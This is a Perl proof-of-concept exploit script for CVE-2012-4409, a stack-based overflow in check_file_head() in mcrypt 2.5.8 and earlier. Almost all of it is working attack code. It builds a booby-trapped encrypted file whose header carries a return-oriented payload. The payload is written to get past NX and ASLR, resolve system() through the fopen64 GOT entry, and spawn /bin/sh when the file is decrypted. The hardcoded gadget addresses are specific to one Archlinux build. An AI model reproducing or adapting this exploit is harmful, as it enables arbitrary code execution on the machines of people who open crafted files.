#!/usr/bin/perl
 
# Title          : mcrypt <= 2.5.8 STACK based overflow
# Date           : 23/11/2012
# Exploit Author : Tosh
# CVE            : CVE-2012-4409
# Patch          : http://www.openwall.com/lists/oss-security/2012/09/06/8
# Tested on      : Archlinux 3.6.6-1, without SSP
 
 
# This script exploit a stack based overflow in mcrypt <= 2.5.8.
# It bypass NX and ASLR protections, but no SSP.
 
# This exploit craft a crypted file and arbitrary code may be executed if the file is decrypted with a vulnerable version
# of mcrypt. The vulnerable function is check_file_head(), present in src/extra.c. See the CVE details or the patch for more
# informations.
 
# Payload must be adjusted on others plateforms, here is just a Proof of Concept :)
 
use strict;
use warnings;
 
my $filename = 'fake.nc';
 
my $file;
my $payload;
 
print "[+] Build payload.\n";
$payload = payload();
 
print "[+] Build file.\n";
$file = build_file($payload);
 
print "[+] Writing $filename.\n";
write_file();
 
print "[+] DONE.\n";
 
sub write_file {
    die("[-] Can't open $filename : $!\n") unless(open F, '>', $filename);
    print F $file;
    close F;
}
 
sub build_file {
# magic
    $file .= "\x00m\x03";
 
# flags
    $file .= pack('C', 1 << 6);
 
# algorithm
    $file .= "H\@Ck3d\x00";
 
# keysize
    $file .= pack('S', 0xdead);
 
# mode
    $file .= "h\@cK3d\x00";
 
# keymode
    $file .= "H\@CK3D\x00";
 
# sflags
    $file .= "\xff";
 
# payload
    $file .= $_[0];
     
    return $file;
}
 
sub payload {
    my $saved_eip_off = 0x71;       # Buffer len for overwrite saved EIP
    my $v_local_1     = 0x0805b000; # Local variable 1 overwriten
    my $v_local_2     = 0x08048007; # Local variable 2 overwriten
    my $ret_sled      = 5;          # Offset between saved EIP and local variables
    my $strcpy_plt    = 0x080499f0; # strcpy@plt address
    my $fopen64_got   = 0x0805b1c8; # fopen64 got entry
    my $system_off    = 0xfffd6b30; # fopen64 - system
    my $w_mem         = 0x0805b000; # writable memory, without ASLR
 
    my $pop2_ret      = 0x08055a63; # pop; pop; ret
    my $ret           = 0x0805a5ed; # ret
    my $pop_ebx       = 0x08056186; # pop ebx; ret
    my $pop_edi       = 0x08053460; # pop edi; ret
    my $xchg_eax      = 0x080517a4; # xchg eax, edi; ret
    my $add_eax       = 0x0804dabf; # add eax,[ebx-0x2776e73c]; pop ebx; ret
    my $call_eax      = 0x0804b357; # call eax; leave; ret
 
    my $payload;
 
    $payload .= "A"x$saved_eip_off;
    $payload .= pack('L', $ret) x $ret_sled;
    $payload .= pack('L', $pop2_ret);
    $payload .= pack('L', $v_local_1);
    $payload .= pack('L', $v_local_2);
 
# Copy  "/bin/" in +W memory
    $payload .= pack('L', $strcpy_plt);
    $payload .= pack('L', $pop2_ret);
    $payload .= pack('L', $w_mem + 0x00);
    $payload .= pack('L', 0x08057fc2);
 
# Copy "sh" + "\x00" in +W memory
    $payload .= pack('L', $strcpy_plt);
    $payload .= pack('L', $pop2_ret);
    $payload .= pack('L', $w_mem + 0x05);
    $payload .= pack('L', 0x08048bab);
 
# Calc system() address with fopen64 GOT entry
    $payload .= pack('L', $pop_ebx);
    $payload .= pack('L', $fopen64_got + 0x2776e73c);
 
    $payload .= pack('L', $pop_edi);
    $payload .= pack('L', $system_off);
 
    $payload .= pack('L', $xchg_eax);
 
    $payload .= pack('L', $add_eax);
    $payload .= "HaCk";
 
# Call system("/bin/sh")
    $payload .= pack('L', $call_eax);
    $payload .= pack('L', $w_mem);
 
    die("[-] Payload too long !\n") if(length $payload > 0xfe);
    return $payload;
}
